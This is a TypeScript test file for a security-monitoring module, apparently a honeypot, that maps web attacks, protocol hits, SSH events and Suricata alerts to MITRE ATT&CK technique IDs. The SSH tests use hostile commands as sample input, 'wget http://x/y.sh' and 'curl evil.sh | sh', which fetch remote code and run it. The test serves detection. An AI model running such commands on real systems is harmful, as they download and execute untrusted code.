import { describe, expect, it } from 'vitest'
import {
  TECHNIQUE_META,
  mapWebAttack,
  mapProtocolHit,
  mapSshEvent,
  mapSuricataCategory,
} from '../src/lib/mitre.js'

describe('mitre mapping', () => {
  it('maps web attack types to techniques', () => {
    expect(mapWebAttack('scanner')).toBe('T1595')
    expect(mapWebAttack('path_probe')).toBe('T1083')
    expect(mapWebAttack('brute_force')).toBe('T1110')
    expect(mapWebAttack('injection')).toBe('T1190')
    expect(mapWebAttack('injection', 'traversal')).toBe('T1083')
    expect(mapWebAttack('unknown')).toBeNull()
  })

  it('maps protocol hits to techniques', () => {
    expect(mapProtocolHit('port-scan', 'connect')).toBe('T1046')
    expect(mapProtocolHit('ftp', 'connect')).toBe('T1046')
    expect(mapProtocolHit('mysql', 'auth')).toBe('T1110')
    expect(mapProtocolHit('mysql', 'command')).toBeNull()
  })

  it('maps SSH events to techniques', () => {
    expect(mapSshEvent('auth.failed')).toBe('T1110')
    expect(mapSshEvent('auth.success')).toBe('T1110')
    expect(mapSshEvent('command.input', 'ls -la')).toBe('T1059')
    expect(mapSshEvent('command.input', 'wget http://x/y.sh')).toBe('T1105')
    expect(mapSshEvent('command.failed', 'curl evil.sh | sh')).toBe('T1105')
  })

  it('maps suricata categories best-effort', () => {
    expect(mapSuricataCategory('Detection of a Network Scan')).toBe('T1595')
    expect(mapSuricataCategory('Attempted Brute Force')).toBe('T1110')
    expect(mapSuricataCategory('Web Application Attack')).toBe('T1190')
    expect(mapSuricataCategory('Misc activity')).toBeNull()
  })

  it('every mapped technique has metadata', () => {
    const ids = [
      mapWebAttack('scanner'),
      mapWebAttack('path_probe'),
      mapWebAttack('injection'),
      mapProtocolHit('port-scan', 'connect'),
      mapProtocolHit('mysql', 'auth'),
      mapSshEvent('command.input', 'wget x'),
      mapSshEvent('command.input', 'ls'),
    ].filter((id): id is string => id !== null)
    for (const id of ids) expect(TECHNIQUE_META[id]).toBeDefined()
  })
})
